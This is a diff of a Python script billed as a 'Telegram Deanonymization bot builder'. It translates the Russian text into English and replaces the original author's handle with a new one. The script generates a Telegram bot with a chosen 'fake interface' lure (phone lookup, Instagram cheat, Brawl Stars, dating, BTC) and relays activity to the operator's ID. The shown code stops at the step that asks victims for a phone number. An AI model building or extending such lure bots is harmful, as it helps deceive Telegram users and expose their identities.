@@ -29,7 +29,7 @@ print(Fore.RED + '''
 
 
 	''')
-input(Fore.GREEN + "Нажмите Enter")
+input(Fore.GREEN + "Press Enter")
 os.system('clear')
 print(Fore.MAGENTA + ' _____    _   _   _   _ ' + Fore.YELLOW + ' __  __   ______ ')
 print(Fore.MAGENTA + '|  __ \  | \ | | | \ | |' + Fore.YELLOW + '|  \/  | |  ____|')
@@ -39,21 +39,21 @@ print(Fore.MAGENTA + '| |__| | | |\  | | |\  |' + Fore.YELLOW + '| |  | | | |___
 print(Fore.MAGENTA + '|_____/  |_| \_| |_| \_|' + Fore.YELLOW + '|_|  |_| |______|')
 print(Fore.YELLOW + '-----------------------------------------')
 print(Fore.YELLOW + '|' + Fore.BLUE +  " Telegram Deanonymization bot builder  " + Fore.YELLOW + '|')
-print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer: @lamer112311         " + Fore.YELLOW + '|')
-print(Fore.YELLOW + '|' + Fore.BLUE +  "        Channel: cutt.ly/CyberPuffin   " + Fore.YELLOW + '|')
+print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer: @suman333mondal         " + Fore.YELLOW + '|')
+print(Fore.YELLOW + '|' + Fore.BLUE +  "       Channel: t.me/onlinehacking   " + Fore.YELLOW + '|')
 print(Fore.YELLOW + '-----------------------------------------')
-userid = input(Fore.RED +  "Введите свой Telegram ID > ")
-token = input(Fore.BLUE +  "Введите токен бота > ")
+userid = input(Fore.RED +  "Enter your Telegram ID > ")
+token = input(Fore.BLUE +  "Enter your bot token > ")
 print(Fore.CYAN + '''
-[1] Пробив по номеру
-[2] Накрутка инстаграм
-[3] Бравл старс
-[4] Знакомства
+[1] Punched the number
+[2] Instagram cheat
+[3] Brawl stars
+[4] Acquaintance
 [5] BTC BANKER
 	''')
-choice = input(Fore.MAGENTA +  "Выберите вариант фейк интерфейса:>>> ")
+choice = input(Fore.MAGENTA +  "Select the fake interface option:>>> ")
 if not choice.isdigit():
-	print("Ошибка, вариант должен быть чисельным")
+	print("Error, option must be numeric")
 	exit(0)
 choice = int(choice)
 
@@ -69,23 +69,23 @@ import random
 
 ID = '{userid}'
 bot = telebot.TeleBot("{token}")
-adr = ['Тверская улица, дом 13', 'Проспект 60-летия Октября', 'Улица Винокурова', '3-й Голутвинский переулок']
+adr = ['Tverskaya street, house 13', '60th Anniversary of October Avenue', 'Vinokurova Street', '3rd Golutvinsky Lane']
 bot.send_message(ID, '!BOT STARTED!') 
-print("Бот запущен!")
+print("The bot is running!")
 
 @bot.message_handler(commands=['start'])
 def start(message):
-	bot.send_message(message.chat.id, '''👋 Привет! 👋
-		Это бот, который, может показать информацию по номеру телефона!
-	Для поиска информации, введите команду /getinfo''') 
+	bot.send_message(message.chat.id, '''👋 Hello! 👋
+This is a bot that can show information by phone number!
+To search for information, enter the command /getinfo''') 
 	
-@bot.message_handler(commands=['lamer112311dev'])
+@bot.message_handler(commands=['onlinehacking'])
 def start(message):
-	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: cutt.ly/CyberPuffin') 
+	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
 
 @bot.message_handler(commands=['getinfo'])
 def start(message):
-	msg = bot.send_message(message.chat.id, 'Введите любой номер телефона') 
+	msg = bot.send_message(message.chat.id, 'Enter any phone number') 
 	bot.register_next_step_handler(msg, proc2)
 
 def proc2(message):
